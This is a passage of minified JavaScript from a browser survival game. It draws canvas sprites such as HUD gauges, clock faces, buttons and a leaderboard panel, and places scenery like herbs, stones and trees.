        Be(r, e * 85, e * -9, e * -170, e * 18, e * 10);
        r.restore();
        ye(r, i[3], i[3], e * 10);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 94, e * 317);
        r.bezierCurveTo(e * 110.5, e * 299.5, e * 110.5, e * 299.5, e * 127, e * 282);
        r.closePath();
        ye(r, undefined, i[1], e * 12);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 279, e * 142);
        r.bezierCurveTo(e * 296.5, e * 125.5, e * 296.5, e * 125.5, e * 314, e * 109);
        r.closePath();
        ye(r, undefined, i[1], e * 12);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 93, e * 106);
        r.bezierCurveTo(e * 110.5, e * 124, e * 110.5, e * 124, e * 128, e * 142);
        r.closePath();
        ye(r, undefined, i[1], e * 12);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 281, e * 282);
        r.bezierCurveTo(e * 296, e * 297.5, e * 296, e * 297.5, e * 311, e * 313);
        r.closePath();
        ye(r, undefined, i[1], e * 12);
        return t;
      }(0.3, ["#ad8850", "#714f24", "#9f7d4a", "#b38e59", "#413624"]));
      sprite[Ie.HURT_DEAD_BOX] = te(function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        t.width = e * 400;
        t.height = e * 400;
        r.save();
        r.translate(e * 202.5, e * 147.5);
        Be(r, e * -96.5, e * -21.5, e * 193, e * 43, e * 0);
        r.restore();
        ye(r, i[0], i[0], e * 12);
        r.save();
        r.translate(e * 202.5, e * 190.5);
        Be(r, e * 96.5, e * -21.5, e * -193, e * 43, e * 0);
        r.restore();
        ye(r, i[0], i[0], e * 12);
        r.save();
        r.translate(e * 202.5, e * 233.5);
        Be(r, e * -96.5, e * -20.5, e * 193, e * 41, e * 0);
        r.restore();
        ye(r, i[0], i[0], e * 12);
        r.save();
        r.translate(e * 202.5, e * 275);
        Be(r, e * 96.5, e * -21, e * -193, e * 42, e * 0);
        r.restore();
        ye(r, i[0], i[0], e * 12);
        r.save();
        r.translate(e * 203.5, e * 121.5);
        Be(r, e * -115.5, e * -20.5, e * 231, e * 41, e * 10);
        r.restore();
        ye(r, i[0], i[0], e * 12);
        r.save();
        r.translate(e * 203.5, e * 299);
        Be(r, e * -115.5, e * -20, e * 231, e * 40, e * 10);
        r.restore();
        ye(r, i[0], i[0], e * 12);
        r.save();
        r.translate(e * 298.5, e * 210);
        Be(r, e * -20.5, e * -109, e * 41, e * 218, e * 10);
        r.restore();
        ye(r, i[0], i[0], e * 12);
        r.save();
        r.translate(e * 108.5, e * 210);
        Be(r, e * -20.5, e * -109, e * 41, e * 218, e * 10);
        r.restore();
        ye(r, i[0], i[0], e * 12);
        return t;
      }(0.3, ["#BB0000"]));
      sprite[Ie.WINDMILL_FLOUR] = ci(1, [{
        f: Qr,
        x: 0,
        y: 0,
        a: 1,
        r: 0,
        c: ["#B3AA8E", "#817961", "#EBEAE2", "#E0DFD8"]
      }], 0.25, ["#d2c77b", "#e7dc8f", "#bfb360"], 0.7);
      sprite[Ie.LAVA_HEART] = ci(1.5, [{
        f: Hr,
        x: 0,
        y: 0,
        a: 1,
        r: 0,
        c: ["#120202", "#750a0a", "#991616", "#120202"]
      }], 0.45, ["#5bbcc9", "#73d2df", "#4daab6"], 0.9);
      sprite[Ie.HEART_SYMBOL_HUD] = An(0.35, ["#072428", "#67A242", "#67A242"], 0);
      sprite[Ie.COLD_SYMBOL_HUD] = An(0.35, ["#172130", "#649BB2", "#FFFFFF", "#FFFFFF", "#90C2D3", "#649BB2", "#84BDD1", "#2F5866"], 1);
      sprite[Ie.FOOD_SYMBOL_HUD] = An(0.35, ["#3F0B11", "#B13424", "#FFFFFF", "#B13424", "#7e180b"], 2);
      sprite[Ie.WATER_SYMBOL_HUD] = An(0.35, ["#1B2F4C", "#29488E", "#76c3e8", "#ffffff"], 3);
      if (mobile) {
        sprite[Ie.LEADERBOARD] = te(function (e) {
          var i = document.createElement("canvas");
          var t = i.getContext("2d");
          var r = e * 200;
          var n = e * 180;
          var a = e * 8;
          i.width = r;
          i.height = n;
          t.beginPath();
          Be(t, 0, 0, r, n - a, a);
          t.globalAlpha = 0.8;
          ye(t, "#1D6055");
          t.globalAlpha = 1;
          var o = Zi(e, "Leaderboard", 25, "#FFF");
          t.drawImage(o, (r - o.width) / 2, e * 5);
          return i;
        }(1));
      } else {
        sprite[Ie.LEADERBOARD] = te(function (e) {
          var i = document.createElement("canvas");
          var t = i.getContext("2d");
          var r = e * 200;
          var n = e * 270;
          var a = e * 8;
          i.width = r;
          i.height = n + 20;
          t.beginPath();
          Be(t, 0, 0, r, n - a, a);
          t.globalAlpha = 0.5;
          ye(t, "#1D6055");
          t.globalAlpha = 1;
          var o = Zi(e, "Leaderboard", 25, "#FFF");
          t.drawImage(o, (r - o.width) / 2, e * 5);
          return i;
        }(1));
      }
      if (mobile) {
        sprite[Ie.GAUGES] = te(function (e) {
          var i = document.createElement("canvas");
          var t = i.getContext("2d");
          var r = e * 335;
          var n = e * 250;
          var a = e * 120;
          var o = e * 20;
          var s = e * 35;
          var _ = e * 65;
          var E = e * 2;
          var T = e * 4;
          i.width = r;
          i.height = a;
          t.beginPath();
          t.translate(0, e * 15);
          Be(t, _, 0, n, o, E);
          ye(t, null, "#69A148", T);
          t.translate(0, s);
          Be(t, _, 0, n, o, E);
          ye(t, null, "#AF352A", T);
          t.translate(0, s);
          Be(t, _, 0, n, o, E);
          ye(t, null, "#669BB1", T);
          return i;
        }(0.75));
      } else {
        sprite[Ie.GAUGES] = te(function (e) {
          var i = document.createElement("canvas");
          var t = i.getContext("2d");
          var r = e * 950;
          var n = e * 180;
          var a = e * 50;
          var o = e * 20;
          var s = e * 240;
          var _ = e * 35;
          var E = e * 1;
          var T = e * 4;
          var A = e * 4;
          i.width = r;
          i.height = a;
          t.translate(0, e * 15);
          Be(t, _, E, n, o, T);
          ye(t, null, "#69A148", A);
          var d = sprite[Ie.HEART_SYMBOL_HUD];
          t.drawImage(d, 17, -8);
          t.translate(s, 0);
          Be(t, _, E, n, o, T);
          ye(t, null, "#AF352A", A);
          d = sprite[Ie.FOOD_SYMBOL_HUD];
          t.drawImage(d, 17, -9);
          t.translate(s, 0);
          Be(t, _, E, n, o, T);
          ye(t, null, "#669BB1", A);
          d = sprite[Ie.COLD_SYMBOL_HUD];
          t.drawImage(d, 17, -8);
          t.translate(s, 0);
          Be(t, _, E, n, o, T);
          ye(t, null, "#074A87", A);
          d = sprite[Ie.WATER_SYMBOL_HUD];
          t.drawImage(d, 17, -8);
          return i;
        }(1));
      }
      if (mobile) {
        sprite[Ie.OXYGEN] = te(dn(0.75));
      } else {
        sprite[Ie.OXYGEN] = te(dn(1));
      }
      sprite[Ie.DELAY_HELMET] = te(Or(0.16, true, ["rgba(0, 0, 0, 0)", "#FFFFFF", "#FFFFFF", "#FFFFFF", "#FFFFFF"]));
      sprite[Ie.DELAY_WEAPON] = te(we(5.8, Bi(0.15, true, ["rgba(0, 0, 0, 0)", "#FFFFFF", "#FFFFFF", "#FFFFFF", "#FFFFFF"])));
      sprite[Ie.COUNTER] = [];
      sprite[Ie.SLOT_NUMBER] = [];
      for (i = 0; i < ds.WITH_BAG + 2; i++) {
        sprite[Ie.SLOT_NUMBER][i] = Zi(1, "" + (i + 1), 12, "#FFF");
      }
      sprite[Ie.RECIPE_BUTTON] = [];
      sprite[Ie.RECIPE_BUTTON].push(te(hn(0.12, ["#442F19", "#2C2112", "#C09D6F", "#A37943", "#eda80d"])));
      sprite[Ie.RECIPE_BUTTON].push(te(hn(0.12, ["#553b20", "#3e2f1a", "#d1ad7d", "#b3864c", "#eda80d"], 1)));
      sprite[Ie.RECIPE_BUTTON].push(te(hn(0.12, ["#30200f", "#20180c", "#a78559", "#855f2f", "#b37d08"], 1)));
      sprite[Ie.CLOCK] = [];
      sprite[Ie.CLOCK].push(te(function (e) {
        var i = document.createElement("canvas");
        var t = i.getContext("2d");
        i.width = e * 321;
        i.height = e * 345;
        t.translate(0, e * 5);
        t.translate(0, e * 20);
        ze(t, e * 160.5, e * 159.5, e * 156.39595138242822);
        ye(t, "#322413", "#322413", e * 4);
        t.translate(0, e * -20);
        ze(t, e * 160.5, e * 159.5, e * 156.39595138242822);
        ye(t, "#392C16", "#5E3E1A", e * 10);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 31.999969482421875, e * 163.07290649414062);
        t.bezierCurveTo(e * 22.999969482421875, e * 67.07290649414062, e * 106, e * 20.072906494140625, e * 162, e * 23.072906494140625);
        t.bezierCurveTo(e * 269.9999694824219, e * 31.072906494140625, e * 292.9999694824219, e * 120.07290649414062, e * 294.9999694824219, e * 161.07290649414062);
        t.bezierCurveTo(e * 165.49996948242188, e * 162.07290649414062, e * 165.49996948242188, e * 162.07290649414062, e * 35.999969482421875, e * 163.07290649414062);
        t.closePath();
        ye(t, "#12432D");
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 32.999969482421875, e * 165.07290649414062);
        t.bezierCurveTo(e * 16.999969482421875, e * 221.07290649414062, e * 85, e * 289.0729064941406, e * 156, e * 294.0729064941406);
        t.bezierCurveTo(e * 263.9999694824219, e * 293.0729064941406, e * 295.9999694824219, e * 199.07290649414062, e * 294.9999694824219, e * 159.07290649414062);
        t.closePath();
        ye(t, "#3A2A0D");
        ze(t, e * 161, e * 158.07290649414062, e * 133.4053971921676);
        ye(t, undefined, "#5E3E1A", e * 10);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 31.999969482421875, e * 161.62844848632812);
        t.bezierCurveTo(e * 162.49996948242188, e * 161.62844848632812, e * 162.49996948242188, e * 161.62844848632812, e * 292.9999694824219, e * 161.62844848632812);
        t.closePath();
        ye(t, undefined, "#5E3E1A", e * 12);
        t.translate(0, e * 8);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 66, e * 158.29513549804688);
        t.bezierCurveTo(e * 86, e * 158.29513549804688, e * 86, e * 158.29513549804688, e * 106, e * 158.29513549804688);
        t.closePath();
        ye(t, undefined, "#c7a726", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 57.999969482421875, e * 117.29513549804688);
        t.bezierCurveTo(e * 85, e * 128.29513549804688, e * 85, e * 128.29513549804688, e * 113, e * 139.29513549804688);
        t.closePath();
        ye(t, undefined, "#c7a726", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 95, e * 90.29513549804688);
        t.bezierCurveTo(e * 112, e * 105.79513549804688, e * 112, e * 105.79513549804688, e * 129, e * 121.29513549804688);
        t.closePath();
        ye(t, undefined, "#c7a726", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 116, e * 52.850677490234375);
        t.bezierCurveTo(e * 130, e * 83.85067749023438, e * 130, e * 83.85067749023438, e * 144, e * 114.85067749023438);
        t.closePath();
        ye(t, undefined, "#c7a726", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 159, e * 61.295135498046875);
        t.bezierCurveTo(e * 160.49996948242188, e * 92.29513549804688, e * 160.49996948242188, e * 92.29513549804688, e * 160, e * 123.29513549804688);
        t.closePath();
        ye(t, undefined, "#c7a726", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 203, e * 51.295135498046875);
        t.bezierCurveTo(e * 190.49996948242188, e * 83.29513549804688, e * 190.49996948242188, e * 83.29513549804688, e * 176, e * 115.29513549804688);
        t.closePath();
        ye(t, undefined, "#c7a726", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 225, e * 89.29513549804688);
        t.bezierCurveTo(e * 210.49996948242188, e * 104.79513549804688, e * 210.49996948242188, e * 104.79513549804688, e * 194, e * 120.29513549804688);
        t.closePath();
        ye(t, undefined, "#c7a726", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 266.9999694824219, e * 112.29513549804688);
        t.bezierCurveTo(e * 233.49996948242188, e * 127.29513549804688, e * 233.49996948242188, e * 127.29513549804688, e * 199, e * 142.29513549804688);
        t.closePath();
        ye(t, undefined, "#c7a726", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 256.9999694824219, e * 155.29513549804688);
        t.bezierCurveTo(e * 238.49996948242188, e * 156.29513549804688, e * 238.49996948242188, e * 156.29513549804688, e * 219, e * 157.29513549804688);
        t.closePath();
        ye(t, undefined, "#c7a726", e * 12);
        t.translate(0, e * -8);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 66, e * 158.29513549804688);
        t.bezierCurveTo(e * 86, e * 158.29513549804688, e * 86, e * 158.29513549804688, e * 106, e * 158.29513549804688);
        t.closePath();
        ye(t, undefined, "#EDCE4F", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 57.999969482421875, e * 117.29513549804688);
        t.bezierCurveTo(e * 85, e * 128.29513549804688, e * 85, e * 128.29513549804688, e * 113, e * 139.29513549804688);
        t.closePath();
        ye(t, undefined, "#EDCE4F", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 95, e * 90.29513549804688);
        t.bezierCurveTo(e * 112, e * 105.79513549804688, e * 112, e * 105.79513549804688, e * 129, e * 121.29513549804688);
        t.closePath();
        ye(t, undefined, "#EDCE4F", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 116, e * 52.850677490234375);
        t.bezierCurveTo(e * 130, e * 83.85067749023438, e * 130, e * 83.85067749023438, e * 144, e * 114.85067749023438);
        t.closePath();
        ye(t, undefined, "#EDCE4F", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 159, e * 61.295135498046875);
        t.bezierCurveTo(e * 160.49996948242188, e * 92.29513549804688, e * 160.49996948242188, e * 92.29513549804688, e * 160, e * 123.29513549804688);
        t.closePath();
        ye(t, undefined, "#EDCE4F", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 203, e * 51.295135498046875);
        t.bezierCurveTo(e * 190.49996948242188, e * 83.29513549804688, e * 190.49996948242188, e * 83.29513549804688, e * 176, e * 115.29513549804688);
        t.closePath();
        ye(t, undefined, "#EDCE4F", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 225, e * 89.29513549804688);
        t.bezierCurveTo(e * 210.49996948242188, e * 104.79513549804688, e * 210.49996948242188, e * 104.79513549804688, e * 194, e * 120.29513549804688);
        t.closePath();
        ye(t, undefined, "#EDCE4F", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 266.9999694824219, e * 112.29513549804688);
        t.bezierCurveTo(e * 233.49996948242188, e * 127.29513549804688, e * 233.49996948242188, e * 127.29513549804688, e * 199, e * 142.29513549804688);
        t.closePath();
        ye(t, undefined, "#EDCE4F", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 256.9999694824219, e * 155.29513549804688);
        t.bezierCurveTo(e * 238.49996948242188, e * 156.29513549804688, e * 238.49996948242188, e * 156.29513549804688, e * 219, e * 157.29513549804688);
        t.closePath();
        ye(t, undefined, "#EDCE4F", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 94.00003051757812, e * 164.40341186523438);
        t.bezierCurveTo(e * 162.50003051757812, e * 164.40341186523438, e * 230.00003051757812, e * 165.40341186523438, e * 231.00003051757812, e * 164.40341186523438);
        t.bezierCurveTo(e * 214.00003051757812, e * 267.4034118652344, e * 92.00003051757812, e * 243.40341186523438, e * 93.00003051757812, e * 165.40341186523438);
        t.closePath();
        ye(t, "#704618", "#5D3D1A", e * 8);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 96, e * 166);
        t.bezierCurveTo(e * 88, e * 117, e * 129, e * 92, e * 161, e * 91);
        t.bezierCurveTo(e * 201, e * 90, e * 223, e * 121, e * 230, e * 161);
        t.closePath();
        ye(t, "#ECBE35", "#EDCE4F", e * 8);
        ze(t, e * 160.00003051757812, e * 166.49432373046875, e * 28.30194339616981);
        ye(t, "#392C16", "#5E3E1A", e * 10);
        return i;
      }(0.22)));
      sprite[Ie.CLOCK].push(te(function (e) {
        var i = document.createElement("canvas");
        var t = i.getContext("2d");
        i.width = e * 321;
        i.height = e * 345;
        t.translate(0, e * 5);
        t.translate(0, e * 20);
        ze(t, e * 160.5, e * 159.5, e * 156.39595138242822);
        ye(t, "#322413", "#322413", e * 4);
        t.translate(0, e * -20);
        ze(t, e * 160.5, e * 159.5, e * 156.39595138242822);
        ye(t, "#392C16", "#5E3E1A", e * 10);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 31.999969482421875, e * 163.07290649414062);
        t.bezierCurveTo(e * 22.999969482421875, e * 67.07290649414062, e * 106, e * 20.072906494140625, e * 162, e * 23.072906494140625);
        t.bezierCurveTo(e * 269.9999694824219, e * 31.072906494140625, e * 292.9999694824219, e * 120.07290649414062, e * 294.9999694824219, e * 161.07290649414062);
        t.bezierCurveTo(e * 165.49996948242188, e * 162.07290649414062, e * 165.49996948242188, e * 162.07290649414062, e * 35.999969482421875, e * 163.07290649414062);
        t.closePath();
        ye(t, "#3A2A0D");
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 32.999969482421875, e * 165.07290649414062);
        t.bezierCurveTo(e * 16.999969482421875, e * 221.07290649414062, e * 85, e * 289.0729064941406, e * 156, e * 294.0729064941406);
        t.bezierCurveTo(e * 263.9999694824219, e * 293.0729064941406, e * 295.9999694824219, e * 199.07290649414062, e * 294.9999694824219, e * 159.07290649414062);
        t.closePath();
        ye(t, "#071A1B");
        ze(t, e * 161, e * 158.07290649414062, e * 133.4053971921676);
        ye(t, undefined, "#5E3E1A", e * 10);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 31.999969482421875, e * 161.62844848632812);
        t.bezierCurveTo(e * 162.49996948242188, e * 161.62844848632812, e * 162.49996948242188, e * 161.62844848632812, e * 292.9999694824219, e * 161.62844848632812);
        t.closePath();
        ye(t, undefined, "#5E3E1A", e * 12);
        t.translate(0, e * 8);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 66, e * 158.29513549804688);
        t.bezierCurveTo(e * 86, e * 158.29513549804688, e * 86, e * 158.29513549804688, e * 106, e * 158.29513549804688);
        t.closePath();
        ye(t, undefined, "#281C08", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 57.999969482421875, e * 117.29513549804688);
        t.bezierCurveTo(e * 85, e * 128.29513549804688, e * 85, e * 128.29513549804688, e * 113, e * 139.29513549804688);
        t.closePath();
        ye(t, undefined, "#281C08", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 95, e * 90.29513549804688);
        t.bezierCurveTo(e * 112, e * 105.79513549804688, e * 112, e * 105.79513549804688, e * 129, e * 121.29513549804688);
        t.closePath();
        ye(t, undefined, "#281C08", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 116, e * 52.850677490234375);
        t.bezierCurveTo(e * 130, e * 83.85067749023438, e * 130, e * 83.85067749023438, e * 144, e * 114.85067749023438);
        t.closePath();
        ye(t, undefined, "#281C08", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 159, e * 61.295135498046875);
        t.bezierCurveTo(e * 160.49996948242188, e * 92.29513549804688, e * 160.49996948242188, e * 92.29513549804688, e * 160, e * 123.29513549804688);
        t.closePath();
        ye(t, undefined, "#281C08", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 203, e * 51.295135498046875);
        t.bezierCurveTo(e * 190.49996948242188, e * 83.29513549804688, e * 190.49996948242188, e * 83.29513549804688, e * 176, e * 115.29513549804688);
        t.closePath();
        ye(t, undefined, "#281C08", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 225, e * 89.29513549804688);
        t.bezierCurveTo(e * 210.49996948242188, e * 104.79513549804688, e * 210.49996948242188, e * 104.79513549804688, e * 194, e * 120.29513549804688);
        t.closePath();
        ye(t, undefined, "#281C08", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 266.9999694824219, e * 112.29513549804688);
        t.bezierCurveTo(e * 233.49996948242188, e * 127.29513549804688, e * 233.49996948242188, e * 127.29513549804688, e * 199, e * 142.29513549804688);
        t.closePath();
        ye(t, undefined, "#281C08", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 256.9999694824219, e * 155.29513549804688);
        t.bezierCurveTo(e * 238.49996948242188, e * 156.29513549804688, e * 238.49996948242188, e * 156.29513549804688, e * 219, e * 157.29513549804688);
        t.closePath();
        ye(t, undefined, "#281C08", e * 12);
        t.translate(0, e * -8);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 66, e * 158.29513549804688);
        t.bezierCurveTo(e * 86, e * 158.29513549804688, e * 86, e * 158.29513549804688, e * 106, e * 158.29513549804688);
        t.closePath();
        ye(t, undefined, "#5E3C10", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 57.999969482421875, e * 117.29513549804688);
        t.bezierCurveTo(e * 85, e * 128.29513549804688, e * 85, e * 128.29513549804688, e * 113, e * 139.29513549804688);
        t.closePath();
        ye(t, undefined, "#5E3C10", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 95, e * 90.29513549804688);
        t.bezierCurveTo(e * 112, e * 105.79513549804688, e * 112, e * 105.79513549804688, e * 129, e * 121.29513549804688);
        t.closePath();
        ye(t, undefined, "#5E3C10", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 116, e * 52.850677490234375);
        t.bezierCurveTo(e * 130, e * 83.85067749023438, e * 130, e * 83.85067749023438, e * 144, e * 114.85067749023438);
        t.closePath();
        ye(t, undefined, "#5E3C10", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 159, e * 61.295135498046875);
        t.bezierCurveTo(e * 160.49996948242188, e * 92.29513549804688, e * 160.49996948242188, e * 92.29513549804688, e * 160, e * 123.29513549804688);
        t.closePath();
        ye(t, undefined, "#5E3C10", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 203, e * 51.295135498046875);
        t.bezierCurveTo(e * 190.49996948242188, e * 83.29513549804688, e * 190.49996948242188, e * 83.29513549804688, e * 176, e * 115.29513549804688);
        t.closePath();
        ye(t, undefined, "#5E3C10", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 225, e * 89.29513549804688);
        t.bezierCurveTo(e * 210.49996948242188, e * 104.79513549804688, e * 210.49996948242188, e * 104.79513549804688, e * 194, e * 120.29513549804688);
        t.closePath();
        ye(t, undefined, "#5E3C10", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 266.9999694824219, e * 112.29513549804688);
        t.bezierCurveTo(e * 233.49996948242188, e * 127.29513549804688, e * 233.49996948242188, e * 127.29513549804688, e * 199, e * 142.29513549804688);
        t.closePath();
        ye(t, undefined, "#5E3C10", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 256.9999694824219, e * 155.29513549804688);
        t.bezierCurveTo(e * 238.49996948242188, e * 156.29513549804688, e * 238.49996948242188, e * 156.29513549804688, e * 219, e * 157.29513549804688);
        t.closePath();
        ye(t, undefined, "#5E3C10", e * 12);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 96, e * 166);
        t.bezierCurveTo(e * 88, e * 117, e * 129, e * 92, e * 161, e * 91);
        t.bezierCurveTo(e * 201, e * 90, e * 223, e * 121, e * 230, e * 161);
        t.closePath();
        ye(t, "#704618", "#5D3D1A", e * 8);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 94.00003051757812, e * 164.40341186523438);
        t.bezierCurveTo(e * 162.50003051757812, e * 164.40341186523438, e * 230.00003051757812, e * 165.40341186523438, e * 231.00003051757812, e * 164.40341186523438);
        t.bezierCurveTo(e * 214.00003051757812, e * 267.4034118652344, e * 92.00003051757812, e * 243.40341186523438, e * 93.00003051757812, e * 165.40341186523438);
        t.closePath();
        ye(t, "#E1DDD5", "#EAE7E4", e * 8);
        ze(t, e * 160.00003051757812, e * 166.49432373046875, e * 28.30194339616981);
        ye(t, "#392C16", "#5E3E1A", e * 10);
        return i;
      }(0.22)));
      sprite[Ie.ARROW_CLOCK] = te(function (e) {
        var i = document.createElement("canvas");
        var t = i.getContext("2d");
        i.width = e * 321;
        i.height = e * 345;
        t.translate(0, e * 5);
        ze(t, e * 161.00003051757812, e * 165.40341186523438, e * 20.808652046684813);
        ye(t, "#C09D6F", "#A37943", e * 10);
        t.beginPath();
        t.lineCap = "round";
        t.lineJoin = "round";
        t.moveTo(e * 162.00003051757812, e * 48.403411865234375);
        t.bezierCurveTo(e * 172.50003051757812, e * 67.40341186523438, e * 172.50003051757812, e * 67.40341186523438, e * 183.00003051757812, e * 86.40341186523438);
        t.bezierCurveTo(e * 160.50003051757812, e * 86.40341186523438, e * 160.50003051757812, e * 86.40341186523438, e * 138.00003051757812, e * 86.40341186523438);
        t.closePath();
        ye(t, "#C09D6F", "#A37943", e * 10);
        t.save();
        t.translate(e * 161.50003051757812, e * 117.90341186523438);
        Be(t, e * -5.5, e * -37.5, e * 11, e * 75, e * 10);
        t.restore();
        ye(t, "#C09D6F", "#A37943", e * 10);
        t.save();
        t.translate(e * 162.00003051757812, e * 78.90341186523438);
        Be(t, e * -10, e * -5.5, e * 20, e * 11, e * 1);
        t.restore();
        ye(t, "#C09D6F");
        ze(t, e * 161.00003051757812, e * 163.6761474609375, e * 17.08800749063506);
        ye(t, "#C09D6F");
        return i;
      }(0.22));
      sprite[Ie.OPTION_BUTTON] = [];
      sprite[Ie.OPTION_BUTTON].push(te(ri(1.5, ["#795026", "#654320", "#eda80d"], 0)));
      sprite[Ie.OPTION_BUTTON].push(te(ri(1.5, ["#8f5e2c", "#7a5126", "#eda80d"], 1)));
      sprite[Ie.OPTION_BUTTON].push(te(ri(1.5, ["#67441f", "#573819", "#9c6e08"], 1)));
      sprite[Ie.AUTO_FEED] = IMAGES.AUTO_FEED;
      sprite[Ie.BANDAGE_ACTIVATED] = IMAGES.BANDAGE_ACTIVATED;
      sprite[Ie.STOP_REGENERATION] = IMAGES.STOP_REGENERATION;
      sprite[Ie.STOP_REGENERATION_BLIZZARD] = IMAGES.STOP_REGENERATION_BLIZZARD;
      sprite[Ie.SHOW_SPECTATORS] = Zi(1, "Show spectators", 25, "#FFF", undefined, undefined, "#000", 5, 220);
      sprite[Ie.RECONNECT] = Zi(1, "Reconnecting...", 30, "#FFF");
      console.log("Load canvas", Date.now() - e);
    }
    function Cn() {
      var e = o_.time;
      if (sprite[Ie.HERB]) {
        D.drawImage(sprite[Ie.HERB][e][1], m + 480, v + 190);
        D.drawImage(sprite[Ie.HERB][e][2], m + 180, v - 430);
        D.drawImage(sprite[Ie.HERB][e][1], m - 855, v + 100);
        D.drawImage(sprite[Ie.HERB][e][0], m - 550, v - 300);
        D.drawImage(sprite[Ie.HERB][e][0], m - 1020, v - 520);
      }
      if (sprite[Ie.STONES]) {
        D.drawImage(sprite[Ie.STONES][e][1], m - 80, v - 640);
        D.drawImage(sprite[Ie.STONES][e][1], m + 80, v + 490);
        D.drawImage(sprite[Ie.STONES][e][2], m - 180, v - 700);
        D.drawImage(sprite[Ie.STONES][e][0], m + 550, v + 100);
        D.drawImage(sprite[Ie.STONES][e][1], m + 450, v + 300);
        D.drawImage(sprite[Ie.STONES][e][1], m + 780, v + 300);
        D.drawImage(sprite[Ie.STONES][e][2], m + 980, v + 200);
        D.drawImage(sprite[Ie.STONES][e][2], m + 680, v + 600);
        D.drawImage(sprite[Ie.STONES][e][2], m - 380, v + 100);
        D.drawImage(sprite[Ie.STONES][e][2], m + 280, v + 250);
      }
      if (sprite[Ie.PLANT]) {
        D.drawImage(sprite[Ie.PLANT][e][0], m - 590, v);
        D.drawImage(sprite[Ie.PLANT][e][0], m + 120, v - 390);
        D.drawImage(sprite[Ie.PLANT][e][0], m - 270, v + 340);
      }
      if (sprite[Ie.TREE]) {
        D.drawImage(sprite[Ie.TREE][e][4], m - 700, v - 600);
        D.drawImage(sprite[Ie.TREE][e][2], m - 970, v - 250);
        D.drawImage(sprite[Ie.TREE][e][5], m - 720, v - 200);
        D.drawImage(sprite[Ie.TREE][e][2], m - 1020, v + 340);
        D.drawImage(sprite[Ie.TREE][e][0], m - 1120, v - 0);
